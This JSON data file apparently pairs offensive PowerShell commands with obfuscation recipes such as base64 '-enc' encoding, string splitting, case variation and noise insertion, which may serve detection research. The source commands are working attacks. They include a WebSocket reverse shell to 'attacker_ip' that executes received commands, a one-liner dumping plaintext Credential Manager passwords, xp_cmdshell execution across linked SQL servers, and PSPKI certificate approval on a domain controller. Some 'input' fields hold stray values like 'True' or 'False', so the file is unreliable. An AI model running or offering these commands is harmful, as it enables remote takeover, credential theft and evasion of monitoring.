    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "False",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "WebSocket-Based PowerShell Reverse Shell, Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.",
    "origin_cmd": "$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object System.Uri(\"ws://attacker_ip:attacker_port\"); $ClientWebSocket.ConnectAsync($uri, $null).Result; $buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received = $ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 | Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output); $ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }"
  },
  {
    "input": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "output": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "True",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "True",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "True",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "True",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Get stored passwords from Windows Credential Manager, With the following one-liner, we can retrieve all stored credentials from the Credential Manager using the CredentialManager PowerShell module:",
    "origin_cmd": "Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine \":\" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }"
  },
  {
    "input": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "output": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "CustomQuery field",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "CustomQuery field",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "CustomQuery field",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "CustomQuery field",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "CustomQuery field",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "CustomQuery field",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "CustomQuery field",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "CustomQuery field",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a query in all linked instances (try to execute commands), output should be in CustomQuery field",
    "origin_cmd": "Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Query \"exec master..xp_cmdshell 'whoami'\""
  },
  {
    "input": "Use PSPKI module to approve the request",
    "output": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "Use PSPKI module to approve the request",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "Use PSPKI module to approve the request",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Use PSPKI module to approve the request",
    "origin_cmd": "Import-Module PSPKI ; Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest"
  },
  {
